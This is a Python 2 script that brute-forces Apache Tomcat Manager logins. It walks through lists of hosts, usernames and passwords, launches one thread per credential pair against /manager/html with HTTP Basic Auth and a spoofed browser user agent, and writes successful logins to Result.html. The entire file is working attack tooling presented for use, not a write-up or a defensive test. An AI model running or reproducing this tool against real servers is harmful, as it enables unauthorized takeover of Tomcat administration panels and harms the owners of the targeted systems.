#!/usr/bin/env python  
# -*- coding: utf-8 -*-  
# Functions: Idenfy tomcat password
# Code By BlAck.Eagle

import threading, time, random, sys, urllib2, httplib, base64
from copy import copy
import re
from collections import defaultdict, deque


class Tomcatbrute(threading.Thread):
        def __init__(self,server,port,path,user,password):
                threading.Thread.__init__(self)
                self.host = str(server)
                self.port = str(port)
                self.path = str(path)
                self.user = str(user)
                self.password = str(password)
                self.userAgent = "Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 Firefox/26.0"

        
        def writeresult(self,record):
                fp = open('Result.html','a+')
                fp.writelines(record+'')
                fp.close()
        
        def run(self):
                #union = self.user+':'+self.password
                auth = base64.b64encode('%s:%s' % (self.user, self.password)).replace('\n', '')
                #flag = Verificate.HttpRequest().verificate(self.host,self.port,self.path)
                #if (flag):
                #print 'This is a Tomcat!'
                #print base64.b64encode(union)

                print self.getName(),  "-- created."  

                try:
                        h = httplib.HTTP(self.host,self.port)
                        h.putrequest('GET', self.path)
                        h.putheader('Host', self.host+':'+self.port)
						
                        #h.putheader('Authorization', 'Basic %s' % base64.b64encode(union))        
                        h.putheader('Authorization', 'Basic %s' %auth)
                        #print auth
						
                        h.putheader('User-agent', self.userAgent)
                        h.putheader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
                        h.putheader('Accept-Language','en-us')
                        h.putheader('Accept-Encoding','gzip, deflate')
                        
                        h.endheaders()
                        
                        statuscode, statusmessage, headers = h.getreply()
                        #print "Response: ", statuscode, statusmessage
                        #print "Headers: ", headers
                        #print data
                        #print headers['Authorization']
                        #print response.read()
                        #print response.status
                        #print statuscode
                        print headers['Server']

                        if (re.findall(r'Coyote',headers['Server'])):
                                if statuscode==200:
                                        print headers['Server']
                                        print "\t\n[OK]Username:",self.user,"Password:",self.password,"\n"  
                                        self.writeresult(self.host+":"+self.user+":"+self.password+"\n")
                                else:
                                        print "\t\nThis is not Tomcat\n"  
                        else:
                                pass
                                #print "\t\n[X]Wrong username or password!\n"
                except :
                        #print "An error occurred:", msg
                        pass
def timer():
    now = time.localtime(time.time())
    return time.asctime(now)

if __name__ == '__main__':
        if len(sys.argv) !=5:
                print "\nUsage: ./TomcatBrute.py <urlList> <port> <userlist> <wordlist>\n"
                print "ex: python TomcatBrute.py ip.txt 8080 users.txt wordlist.txt\n"
                sys.exit(1)
 
        try:
                users = open(sys.argv[3], "r").readlines()
        except(IOError):
                print "Error: Check your userlist path\n"
                sys.exit(1)
   
        try:
                words = open(sys.argv[4], "r").readlines()
        except(IOError):
                print "Error: Check your wordlist path\n"
                sys.exit(1)
        
        try:
                port = sys.argv[2]
        except(IOError):
                print "Error: Check your port\n"
 
        path = '/manager/html'
        
        WEAK_USERNAME = [p.replace('\n','') for p in users]
        WEAK_PASSWORD = [p.replace('\n','') for p in words]
        #WEAK_USERNAME = ['tomcat','user']
        #WEAK_PASSWORD = ['tomcat','user']
        accounts =deque()   #listÊý×é
        
        for username in WEAK_USERNAME:
                for password in WEAK_PASSWORD:
                        accounts.append((username,password))
        
        #print len(accounts)
        #server = sys.argv[1]
        
        
        
        host_open = open(sys.argv[1], 'r')
        ip = [p.replace('\n','') for p in host_open]
        for server in ip:
                print "[+] Server:",server
                print "[+] Port:",port
                print "[+] Users Loaded:",len(WEAK_USERNAME)
                print "[+] Words Loaded:",len(WEAK_PASSWORD)
                print "[+] Started",timer(),"\n"
                
                for I in range(len(accounts)):
                        work = Tomcatbrute(server,port,path,accounts[I][0],accounts[I][1])
                        work.setDaemon(1)
                        work.start()
                        time.sleep(0.1)
                print "\n[-] Done -",timer(),"\n"